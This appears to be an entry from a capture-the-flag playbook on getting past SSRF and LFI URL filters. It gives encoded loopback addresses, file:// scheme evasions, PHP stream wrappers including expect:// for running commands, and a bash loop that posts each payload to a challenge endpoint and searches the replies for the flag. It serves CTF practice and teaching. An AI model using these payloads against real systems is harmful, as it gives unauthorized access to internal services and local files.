---
id: ssrf-lfi-filter-bypass
category: WEB
tags: [ssrf, lfi, filtro-de-url, file-wrapper, php-filter, ip-encoding, fuzzing]
tools: []
manuals: []
title: "SSRF/LFI — URL-filter bypass fuzzing"
difficulty: medium
created: 2026-09-03
updated: 2026-09-03
related: []
---

## How to recognize this pattern

- The app takes a URL/address via a parameter (a form field like `url`, `target`, `link`, `image`,
  `webhook`) and makes a request from the server (SSRF) or reads the content as a local file (LFI) to
  return/process it.
- Strong signal: there's some kind of visible validation/filter (it blocks `localhost`, `127.0.0.1`,
  literal `file://`) — i.e. the dev tried to block the obvious, which suggests alternative
  representations of the same target get through.
- The challenge usually has a fixed target in mind: an internal endpoint (`/flag`, `/flag.txt`,
  `/admin`) or a sensitive local file.

## Method

**This is NOT a script to copy with the host/payload fixed from the previous challenge** — it's a
candidate-generation technique + test flow. Adapt the 3 blocks below to the current challenge (real
target, field name, flag format) before running.

### 1. Generate "internal address" candidates (IP/host blocklist bypass)

A filter that blocks the string `127.0.0.1`/`localhost` almost always forgets equivalent
representations of the same address:

- **Decimal:** `127.0.0.1` → `2130706433`
- **Octal:** `127.0.0.1` → `0177.0.0.1`
- **Hex:** `127.0.0.1` → `0x7f000001`
- **IPv6 loopback:** `[::1]`
- **Short form:** `127.1` (the OS still resolves it as `127.0.0.1`)
- **Bare `0`** (many OSes treat `0.0.0.0`/`0` as loopback in certain contexts)

### 2. Generate wrapper/protocol candidates (scheme blocklist bypass)

If the filter blocks the literal string `file://`:

- Case variation: `FILE://`, `fIlE://`
- Extra/missing slashes: `file:/x`, `file:////x`, `file:///./x`, `file:///../x`
- URL-encode the scheme itself: `%66%69%6c%65%3a///x` (single encode), or double-encode if the server
  decodes twice
- Alternative wrappers (if the stack is PHP and allows streams): `php://filter/convert.base64-encode/resource=<target>`,
  `expect://<command>`, `dict://<host>:<port>/<something>`, `zip://file.zip#internal`,
  `compress.zlib://<target>`

### 3. Automated test flow (adapt, don't copy literally)

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET="<CHALLENGE_URL>"         # endpoint that takes the parameter
FIELD="<field_name>"             # url | target | link | image ...
FLAG_REGEX='<FLAG_PREFIX>\{[^}]*\}'   # e.g. something\{.*\}

# build the payload list by combining the two sections above
PAYLOADS=( "file:///flag.txt" "http://127.0.0.1/flag" "http://2130706433/flag" ... )

for p in "${PAYLOADS[@]}"; do
    resp=$(curl -s -m 15 -X POST "$TARGET" -d "${FIELD}=${p}")
    if echo "$resp" | grep -qoP "$FLAG_REGEX"; then
        echo "FLAG via payload '$p':"
        echo "$resp" | grep -oP "$FLAG_REGEX"
        break
    fi
    # if the response carries an embedded temporary link/URL (webhook pattern), follow it too:
    link=$(echo "$resp" | grep -oP 'https?://[0-9A-Za-z./:?=&_%#-]+' | head -n1 || true)
    [[ -n "$link" ]] && curl -s -m 15 "$link" | grep -oP "$FLAG_REGEX" && break
done
```

The key logic to preserve: **test in batch, stop at the first hit, follow intermediate links the
response might contain** (some challenges respond with a temporary URL/callback instead of the flag
directly).

## Gotchas

- Adjust `FLAG_REGEX` to the current CTF's real flag format before running, otherwise grep never
  matches even with the flag in the response.
- Test variations of the field name (`url`, `target`, `u`, `link`) if the obvious field does nothing —
  the payload list is only half the equation.
- If the stack isn't PHP, the `php://` wrappers make no sense — don't waste time on them.
- If nothing in the list works, consider that the filter may be blocking via a more aggressive regex
  (e.g. anything that isn't a "normal" domain) — in that case the vector may be another one (DNS
  rebinding, redirect chain) outside the scope of this entry.

## Related / Cross-reference

If the SSRF target turns out to be a custom service rather than plain HTTP, see `Arsenal/NET/` (to be
created) for raw-socket interaction.
